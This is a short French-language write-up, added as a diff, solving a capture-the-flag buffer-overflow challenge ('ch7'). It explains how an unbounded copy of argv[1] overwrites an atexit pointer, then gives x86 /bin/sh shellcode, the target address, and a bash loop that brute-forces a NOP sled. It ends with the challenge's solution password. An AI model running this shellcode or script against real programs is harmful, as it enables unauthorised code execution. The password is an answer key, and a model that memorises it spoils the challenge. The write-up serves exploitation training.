@@ -1,0 +1,26 @@
+La faille se situe dans la copie de argv[1] dans username sans taille definie.
+On va donc pouvoir ecraser l'appel a "_atexit" pour y lancer un shell.
+
+On va utiliser le shellcode "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" pour lancer /bin/sh (source: http://shellblade.net/shellcode.html).
+
+Pour qu'il s'execute, on va y mettre l'adresse de username ensuite
+`nm ch7 | grep username` = 0804a040
+little indian donc on inverse -> "\x40\xa0\x04\x08"
+
+On va donc ecrire x caracteres inutiles (on va utiliser des NOP Operations) suivis de notre shellcode puis de l'adresse d'username
+
+En bon faineant, on va faire un script qui va appeler ch7 avec un nombre de NOP qui va s'incrementer (on finira bien par appeler notre /bin/sh :p).
+
+-------------------------
+#!/bin/bash
+SHELLCODE="\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
+USERNAME_ADDR="\x40\xa0\x04\x08"
+NOP_OP=""
+while [ true ]; do
+   NOP_OP="\x90$NOP_OP"
+   /challenge/app-systeme/ch7/ch7 `printf "$NOP_OP$SHELLCODE$USERNAME_ADDR"`
+done
+-------------------------
+
+result = aod8r2f!q:;oe
+
